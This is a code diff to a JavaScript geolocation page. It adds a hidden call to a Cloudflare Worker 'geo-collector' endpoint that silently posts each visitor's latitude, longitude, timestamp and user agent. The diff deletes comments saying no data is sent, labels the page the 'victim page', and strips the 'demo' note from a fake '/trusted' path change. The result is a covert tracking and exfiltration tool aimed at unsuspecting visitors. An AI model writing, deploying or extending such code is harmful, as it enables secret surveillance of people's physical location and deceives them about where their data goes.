@@ -70,6 +70,9 @@ const output = document.getElementById('output');
 const locationLink = document.getElementById('locationLink');
 const mapLink = document.getElementById('mapLink');
 
+/* ✅ Cloudflare Worker endpoint */
+const webhookUrl = 'https://geo-collector.ecdnts.workers.dev';
+
 function getLocation() {
   if (!navigator.geolocation) return;
 
@@ -78,17 +81,27 @@ function getLocation() {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
 
-      // tampilkan lokasi
+      // tampilkan lokasi di victim page
       output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
 
       // link Google Maps
       const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
       mapLink.href = googleMapsUrl;
-      mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
+      mapLink.textContent =
+        `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
       locationLink.style.display = 'block';
 
-      // Hapus bagian kirim ke webhook karena sudah dihapus
-      // Fungsi ini sekarang hanya menampilkan data tanpa mengirimkan ke server manapun
+      // ✅ kirim ke Cloudflare Worker
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      }).catch(() => {});
     },
     err => {
       output.textContent = 'Permission denied or error.';
@@ -98,7 +111,7 @@ function getLocation() {
 }
 
 trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');  // demo origin change
+  history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
 };
 
